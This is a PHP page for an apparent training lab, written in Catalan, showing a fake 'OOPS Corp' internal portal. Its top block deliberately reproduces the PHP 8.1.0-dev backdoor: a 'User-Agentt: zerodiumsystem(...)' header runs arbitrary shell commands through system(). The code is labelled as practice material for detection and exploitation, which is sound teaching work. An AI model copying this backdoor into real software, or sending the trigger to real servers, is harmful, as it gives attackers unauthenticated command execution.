<?php
// -----------------------------------------------------------------------------
//  REPRODUCCIÓ DIDÀCTICA del backdoor de PHP 8.1.0-dev (CVE del git tainted).
//  El backdoor original s'activava amb la capçalera "User-Agentt: zerodiumsystem('...')".
//  Aquí NO fem servir el binari real: emulem el comportament per practicar la
//  detecció i explotació. Elimina aquest bloc si vols un repte més "net".
// -----------------------------------------------------------------------------
$ua2 = $_SERVER['HTTP_USER_AGENTT'] ?? '';
if (preg_match('/^zerodiumsystem\((.*)\)$/', $ua2, $m)) {
    // $m[1] ve com "'comanda'"  -> traiem les cometes
    $cmd = trim($m[1], "'\"");
    header('Content-Type: text/plain');
    system($cmd);
    exit;
}
?>
<!doctype html>
<html lang="ca"><head><meta charset="utf-8"><title>OOPS Corp — Portal</title></head>
<body style="font-family:sans-serif;max-width:640px;margin:40px auto">
  <h1>OOPS Corp — Portal intern</h1>
  <p>Benvingut al portal. Fes servir el teu compte per entrar.</p>
  <ul>
    <li><a href="login.php">Iniciar sessió</a></li>
    <li><a href="tools.php">Eina de diagnòstic de xarxa</a></li>
  </ul>
  <!-- Nota per l'equip: encara tenim PHP 8.1.0-dev al servidor de proves... canviar! -->
  <hr><small>Powered by PHP <?php echo phpversion(); ?> · nginx</small>
</body></html>
